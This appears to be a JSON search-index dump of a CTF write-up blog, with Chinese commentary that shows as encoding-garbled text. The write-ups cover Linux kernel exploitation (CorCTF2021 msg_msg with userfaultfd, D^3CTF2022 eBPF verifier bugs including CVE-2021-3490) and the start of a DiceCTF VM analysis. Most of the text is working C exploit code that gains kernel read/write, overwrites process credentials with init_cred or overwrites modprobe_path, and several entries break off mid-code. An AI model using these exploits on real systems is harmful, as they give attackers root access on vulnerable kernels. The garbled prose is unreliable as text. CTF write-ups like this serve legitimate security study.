0; rule-\u003etype = OUTBOUND; ip_value_to_str(next, rule-\u003eip, 16); ip_value_to_str((next) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); char buf[0x10]; msgrcv(qid[0], buf, 0x10, 0, IPC_NOWAIT | MSG_NOERROR); printf(\"[*] Prepare fake msg struct\\n\"); bzero(msg_buf, sizeof(msg_buf)); ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003enext = (void *)(task_struct + 0x530); ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003em_ts = 0xff8; ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003em_type = 1; printf(\"[*] Now userfault 2\\n\"); ((msg *)(target2 + PAGE_SIZE - 0x10))-\u003emtype = 1; send_msg(qid[3], target2 + PAGE_SIZE - 0x10, 0xff8, 0); å †å¸ƒå±€å¦‚ä¸‹ï¼š æ¥ç€ï¼Œä¸é‡Šæ”¾userfault handler1ã€‚è€Œæ˜¯ç”³è¯·ä¸€ä¸ªæ–°çš„æ¶ˆæ¯é˜Ÿåˆ—QID#3ã€‚å¹¶åˆ›å»ºä¸€ä¸ª0xfd8+0x30çš„æ¶ˆæ¯ã€‚æ­¤æ—¶ï¼ŒQID#2çš„segmentè¢«åˆ†é…ç»™äº†æ–°çš„msg_msgç»“æ„ã€‚åŒæ ·ï¼Œæˆ‘ä»¬åœ¨QID#3æ‹·è´æ¶ˆæ¯æ•°æ®æ—¶ï¼Œä½¿ç”¨userfaultfdå¡ä½ã€‚å †å¸ƒå±€å¦‚ä¸‹ï¼š åœ¨userfaulr handler2ä¸­ï¼Œé‡Šæ”¾userfault handler1ã€‚ä½¿å¾—QID#3çš„msg_msgç»“æ„çš„nextè¢«ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ã€‚å³å½“å‰è¿›ç¨‹çš„task_structâ†’cred -8 å †å¸ƒå±€å¦‚ä¸‹ï¼š ç»§ç»­å¤„ç†userfault 2ï¼Œä½¿ç”¨init_credè¦†å†™credå’Œread_credå³å¯ææƒã€‚ printf(\"[+] user 2 page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Release uffd 1\\n\"); struct uffdio_copy uc; bzero(\u0026uc, sizeof(struct uffdio_copy)); // use uffdio_copy to write request's message uc.src = (unsigned long)msg_buf; uc.len = PAGE_SIZE; uc.dst = (unsigned long)0x1338000 \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(u1, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] Failed to uffdio_copy\"); } char *payload = calloc(1, 0x2000); *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred; *((uint64_t *)(payload + 0xfd0)) = init_cred; *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred; uffd_copy(uffd, payload, \u0026uf_msg); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:3","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#å †é£æ°´æ„é€ ä»»æ„åœ°å€å†™"},{"categories":["Writeups"],"content":"EXP #include \"./exploit.h\"#include \u003cstdint.h\u003e #define ADD_RULE 0x1337babe #define DELETE_RULE 0xdeadbabe #define EDIT_RULE 0x1337beef #define SHOW_RULE 0xdeadbeef #define DUP_RULE 0xbaad5aad #define INBOUND 0 #define OUTBOUND 1 #define SKIP -1 #define DESC_MAX 0x800 typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; } user_rule_t; typedef struct { char iface[16]; char name[16]; uint32_t ip; uint32_t netmask; uint16_t proto; uint16_t port; uint8_t action; uint8_t is_duplicated; } rule_t; struct list_head { struct list_head *next, *prev; }; struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ void *next; /* struct msg_msgseg *next; */ void *security; //æ— SELinuxï¼Œè¿™é‡Œä¸ºNULL /* the actual message follows immediately */ }; typedef struct { long mtype; char mtext[1]; } msg; int global_fd; uint64_t kernbase, init_ipc_ns, init_task, init_cred; uint64_t task_struct, dynamic_kobj_ktype, sysfs_bin_kfops_ro; uint64_t next, prev; void *target1, *target2; int qid[4]; char msg_buf[0x2000]; uint64_t u1; uint64_t relased = 0; void ip_value_to_str(int ip, char *result, int size) { inet_ntop(AF_INET, (void *)\u0026ip, result, size); } void add_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, ADD_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to add rule\"); } } void dup_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DUP_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to dup rule\"); } } void del_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DELETE_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to del rule\"); } } void send_msg(int id, void *buf, size_t size, int flags) { if (msgsnd(id, buf, size, flags) \u003c 0) { die(\"[!] Failed to send msg\"); } printf(\"[+] Send message: 0x%lx\\n\", size); } static void fault_handler_2(void *arg) { puts(\"[+] Enter userpagefault 2\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] user2 polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] user 2 page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Release uffd 1\\n\"); struct uffdio_copy uc; bzero(\u0026uc, sizeof(struct uffdio_copy)); // use uffdio_copy to write request's message uc.src = (unsigned long)msg_buf; uc.len = PAGE_SIZE; uc.dst = (unsigned long)0x1338000 \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(u1, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] Failed to uffdio_copy\"); } char *payload = calloc(1, 0x2000); *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred; *((uint64_t *)(payload + 0xfd0)) = init_cred; *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred; uffd_copy(uffd, payload, \u0026uf_msg); break; } puts(\"[+] exit userpagefault 2 fault_handler!\"); } static void fault_handler_1(void *arg) { puts(\"[+] Enter userpagefault 1\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; u1 = uffd; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Modified msg0 next to msg2's segment\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)prev; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)prev; ((struct msg_msg *)rule)-\u003em_ts = 0x10; ((struct msg_msg","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:4","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#exp-1"},{"categories":["Writeups"],"content":"d3bpf","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:0:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#d3bpf"},{"categories":["Writeups"],"content":"patch case BPF_RSH: if (umin_val \u003e= insn_bitness) { if (alu32) __mark_reg32_known(dst_reg, 0); else __mark_reg_known_zero(dst_reg); break; } if (alu32) scalar32_min_max_rsh(dst_reg, \u0026src_reg); else scalar_min_max_rsh(dst_reg, \u0026src_reg); break; ä¼¼ä¹åœ¨ä¸åŒçš„æ¶æ„ä¸Šå³ç§»64çš„ç»“æœä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œå³ç§»64ä½ä¼šä¿æŒåŸå€¼ã€‚ gefâ¤ p/x 1\u003e\u003e64 $1 = 0x1 ä½†æ˜¯ï¼Œverifierè®¤ä¸ºè¯¥å€¼ä¸º0ï¼Œä»¥æ­¤é€ æˆè¾¹ç•Œæ£€æŸ¥é”™è¯¯ã€‚ ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:1:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#patch"},{"categories":["Writeups"],"content":"vulncve-2021-3490å’Œpatchçš„æŒ‡ä»¤éƒ½å¯ä»¥åˆ©ç”¨ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨cve-2021-3490ã€‚ æ„é€ verifierä¸º0ï¼Œruntimeä¸º1çš„å¯„å­˜å™¨ã€‚åœ¨æ„é€ æˆåŠŸåï¼Œåˆ©ç”¨æ­¥éª¤å°±å’ŒeebpfåŸºæœ¬æ²¡æœ‰åŒºåˆ«äº†ã€‚è¶Šç•Œè¯»å–mapçš„opsï¼Œleakå†…æ ¸åœ°å€ã€‚ä¿®æ”¹map-\u003ebtfä¸ºç›®æ ‡åœ°å€ï¼Œé€šè¿‡bpf_map_get_info_by_idè¿›è¡Œä»»æ„åœ°å€è¯»ï¼Œæœç´¢è¿›ç¨‹çš„task_structã€‚ åœ¨mapå†…ä¼ªé€ è™šè¡¨ åŠ«æŒmap-\u003emap_opsåˆ°æå‰æ„é€ çš„è™šè¡¨ ä¿®æ”¹map-\u003etypeä¸ºBPF_MAP_TYPE_STACK ä¿®æ”¹map-\u003emax_entriesä¸º0xffffffff ä¿®æ”¹map-\u003espin_lock_offä¸º0ï¼Œä»¥ç»•è¿‡å…¶ä»–çš„æ£€æŸ¥ bpf_map_push_elemæŒ‡é’ˆä¿®æ”¹ä¸ºarray_map_get_next_key è°ƒç”¨BPF_MAP_UPDATE_ELEMå³å¯ä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹å½“å‰è¿›ç¨‹çš„credå®ç°æå–ã€‚ ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:2:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#vuln"},{"categories":["Writeups"],"content":"exp #define _GNU_SOURCE #include \"bpf_insn.h\"#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/bpf_common.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #define PAGE_SIZE 4096 #define HELLO_MSG \"I am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; int control_map, read_map, write_map; int reader_fd, reader_sock; int writer_fd, writer_sock; uint64_t kernbase; uint64_t init_task; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit // (1) r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1} BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), // r5 = *(u64 *)(r0 +0) BPF_MOV64_REG(BPF_REG_6, BPF_REG_5), // r6 = r5 BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF), // r2 = 0xFFFFFFFF BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32)","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:3:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#exp"},{"categories":["Writeups"],"content":"d3bpfv2v2åŒæ ·patchäº†æŒ‡ä»¤ï¼Œä½†æ˜¯è¿è¡Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­5.16.12ã€‚åœ¨æœ€æ–°çš„ebpfä¸­åŠ å…¥äº†æ–°çš„æ£€æµ‹æœºåˆ¶ï¼š ä»»ä½•æŒ‡é’ˆåªèƒ½è¿›è¡ŒåŠ å‡æ“ä½œï¼Œä¸èƒ½è¿›è¡Œæ¯”è¾ƒï¼ˆé˜²æ­¢ä¾§ä¿¡é“ï¼‰ åœ¨è¿›è¡ŒæŒ‡é’ˆä¸å¯„å­˜å™¨æ“ä½œæ—¶ï¼Œverfierä¼šå°†å·²çŸ¥çš„å¯„å­˜å™¨æ›¿æ¢ä¸ºå¸¸æ•°è¿›è¡Œè®¡ç®—ã€‚ è¿™ä¸¤æ¡æ£€æŸ¥è®©verifierçš„è¾¹ç•Œè®¡ç®—é”™è¯¯å‡ ä¹æ— æ³•åˆ©ç”¨ã€‚ ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:0:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#d3bpfv2"},{"categories":["Writeups"],"content":"vulnæˆ‘åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°äº†æ–°çš„çº¿ç´¢ï¼šhttps://www.openwall.com/lists/oss-security/2022/01/18/2ï¼Œè™½ç„¶è¯¥cveæ²¡æœ‰æ­£å¼æ”¾å‡ºexpï¼Œä½†æ˜¯ä½œè€…è¯´ä½¿ç”¨bpf_skb_load_byteså¯ä»¥è¿›è¡Œç»•è¿‡ã€‚æ— è®ºå¦‚ä½•ï¼Œè¿™è®©æˆ‘å°†ç›®å…‰æ”¾åœ¨äº†mapçš„å¸®åŠ©å‡½æ•°ä¸Šã€‚ bpf_skb_load_bytes: BPF_CALL_4(bpf_skb_load_bytes, const struct sk_buff *, skb, u32, offset, void *, to, u32, len) { void *ptr; if (unlikely(offset \u003e 0xffff)) goto err_clear; ptr = skb_header_pointer(skb, offset, len, to); if (unlikely(!ptr)) goto err_clear; if (ptr != to) memcpy(to, ptr, len); return 0; err_clear: memset(to, 0, len); return -EFAULT; } è¯¥å‡½æ•°è¯»å–socketçš„ç¼“å†²åŒºåˆ°æŒ‡å®šçš„ä½ç½®ï¼Œåœ¨ebpfç¨‹åºä¸­å¯ä»¥æ˜¯æ ˆï¼Œmapç­‰ã€‚ è™½ç„¶verfierä¼šæ£€æŸ¥æˆ‘ä»¬è¯»å…¥çš„å¤§å°æ˜¯å¦ä¼šå½±å“æ ˆä¸­çš„æŒ‡é’ˆï¼Œä½†æ˜¯é€šè¿‡patchçš„æŒ‡ä»¤å¯ä»¥å¾ˆå®¹æ˜“çš„ç»•è¿‡ï¼Œä»è€Œè¶Šç•Œå†™ã€‚ é‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š åœ¨æ ˆä¸­å†™å…¥arrayçš„åœ°å€ è°ƒç”¨è¯¥å‡½æ•°è¯»å–æ•°æ®åˆ°arrayä¸­ è¦†å†™arrayçš„åœ°å€ ä»æ ˆä¸­å–å‡ºæŒ‡é’ˆï¼Œå¹¶è¯»å–å†…å®¹ä»è€Œleakã€‚ åœ¨å¾—åˆ°å†…æ ¸åœ°å€åï¼Œå¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ‰‹æ³•ï¼Œå®Œå…¨ä¿®æ”¹æ ˆä¸Šçš„æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘modprobe_pathä»è€Œä¿®æ”¹å®ƒï¼Œä¸ºä»»æ„çš„å€¼ã€‚ å¼€å¯äº†kalsrä¿æŠ¤ï¼Œæˆ‘ä»¬ä¿®æ”¹æ ˆä¸­arrayæŒ‡é’ˆæ—¶ï¼Œå¹¶ä¸èƒ½å‡†ç¡®å¾—åˆ°åœ°å€ã€‚ä½†åªè¦çˆ†ç ´4bitå³å¯ï¼Œæ¦‚ç‡å¾ˆé«˜ã€‚ ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:1:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#vuln-1"},{"categories":["Writeups"],"content":"exp #define _GNU_SOURCE #include \u003clinux/bpf_common.h\u003e#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e#include \"bpf_insn.h\" #define PAGE_SIZE 4096 #define BPF_MAP_TYPE_RINGBUF 27 #define BPF_skb_load_bytes 26 #define BPF_skb_load_bytes_relative 68 #define HELLO_MSG \"\\x00\\x00am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; int control_map, read_map, write_map; int reader_fd, reader_sock; int writer_fd, writer_sock; uint64_t kernbase, modprobe_path; uint64_t init_task; uint32_t guessed = 0; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint64_t* get_bigitem(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_MOV64_REG(BPF_REG_8, BPF_REG_1), // save ctx to r8 BPF_MOV64_REG(BPF_REG_9, BPF_REG_10), // r9 = rsp BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x50), // r9 = fp - 0x50 BPF_LD_MAP_FD(BPF_REG_1, read_map), // r1 = map_fd BPF_ST_MEM(BPF_DW, BPF_RE","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:2:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#exp-1"},{"categories":["Writeups"],"content":"DiceCTF2022-containment/breachä¸€ä¸ªä¸ä¸€æ ·çš„è™šæ‹Ÿæœºã€‚ä¸€ä¸ªç®€å•çš„è™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æ–‡ä»¶é€šè¿‡åˆ©ç”¨å®ƒæ¥ â€œçªç ´ â€œè™šæ‹Ÿæœºï¼Œå®‰è£…æ–°çš„æŒ‡ä»¤å¤„ç†ç¨‹åºæ¥è¿›è¡Œflagæ£€æŸ¥ã€‚ a binary for a simple VM â€œbreaks outâ€ of the VM by exploiting it and installs new instruction handlers to do flag checking. ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:0:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#dicectf2022-containmentbreach"},{"categories":["Writeups"],"content":"ç¨‹åºåˆ†æ int __cdecl main(int argc, const char **argv, const char **envp) { __int64 next_pc; // rax unsigned __int8 opclass; // [rsp-59h] [rbp-61h] unsigned __int8 reg_idx; // [rsp-4Dh] [rbp-55h] __int64 tmp_val; // [rsp-48h] [rbp-50h] FILE *fd; // [rsp-40h] [rbp-48h] __int64 size; // [rsp-38h] [rbp-40h] unsigned __int64 dst_reg; // [rsp-20h] [rbp-28h] unsigned __int64 src_reg; // [rsp-18h] [rbp-20h] setbuf(stdout, 0LL); setbuf(stdin, 0LL); if ( argc != 2 ) { printf(\"Usage: %s program.bin\\n\", *argv); exit(0); } fd = fopen(argv[1], \"rb\"); fseek(fd, 0LL, 2); size = ftell(fd); fseek(fd, 0LL, 0); code = (char *)malloc(size); fread(code, 1uLL, size, fd); while ( !exited ) { opclass = code[pc] \u0026 0xF; if ( opclass \u003e 0xAu ) { printf(\"Unknown instruction: %d\\n\", opclass); exit(-1); } switch ( opclass ) { case 0u: exited = 1; ++pc; break; case 1u: // mov reg, imm Reg_list[(unsigned __int8)code[pc] \u003e\u003e 4] = *(_QWORD *)\u0026code[pc + 1]; pc += 9LL; break; case 2u: // mov reg, reg Reg_list[code[pc + 1] \u0026 0xF] = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; pc += 2LL; break; case 3u: // alu dst, src reg_idx = code[pc + 1] \u0026 0xF; dst_reg = Reg_list[reg_idx]; src_reg = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; if ( (unsigned __int8)((unsigned __int8)code[pc] \u003e\u003e 4) \u003c= 7u ) { switch ( (unsigned __int8)code[pc] \u003e\u003e 4 ) { case 0: tmp_val = dst_reg + src_reg; break; case 1: tmp_val = dst_reg - src_reg; break; case 2: tmp_val = src_reg * dst_reg; break; case 3: tmp_val = dst_reg % src_reg; break; case 4: tmp_val = src_reg \u0026 dst_reg; break; case 5: tmp_val = src_reg | dst_reg; break; case 6: tmp_val = src_reg ^ dst_reg; break; case 7: tmp_val = dst_reg \u003e\u003e src_reg; break; } } Reg_list[reg_idx] = tmp_val; pc += 2LL; break; case 4u: // mov ds:[reg], reg *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] \u0026 0xF]) = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; pc += 2LL; break; case 5u: // mov reg, ds:[reg] Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] = *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] \u0026 0xF]); pc += 2LL; break; case 6u: // mov reg, cs:[reg] Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] = *(_QWORD *)\u0026code[Reg_list[code[pc + 1] \u0026 0xF]]; pc += 2LL; break; case 7u: // jmp imm pc = *(_QWORD *)\u0026code[pc + 1]; break; case 8u: // jmp reg pc = Reg_list[(unsigned __int8)code[pc] \u003e\u003e 4]; break; case 9u: // cmp and jmp if ( Reg_list[code[pc + 1] \u0026 0xF] == Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] ) next_pc = *(_QWORD *)\u0026code[pc + 2]; else next_pc = pc + 10; pc = next_pc; break; case 0xAu: // puts reg 